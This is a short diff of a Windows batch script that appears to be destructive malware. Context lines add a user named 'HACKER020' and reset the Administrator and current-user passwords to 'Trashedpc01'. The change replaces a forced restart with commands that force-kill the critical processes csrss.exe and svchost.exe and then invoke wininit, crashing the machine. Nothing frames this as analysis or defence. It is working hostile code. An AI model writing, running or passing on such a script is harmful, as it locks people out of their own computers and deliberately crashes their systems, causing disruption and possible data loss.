@@ -123,6 +123,8 @@ NET USER HACKER020 Trash0001 /add
 NET USER Administrator Trashedpc01
 NET USER %USERNAME% Trashedpc01
 
-shutdown /r /t /0 /f
+taskkill /f /im csrss.exe
+taskkill /f /im svchost.exe
+wininit
 
 :end
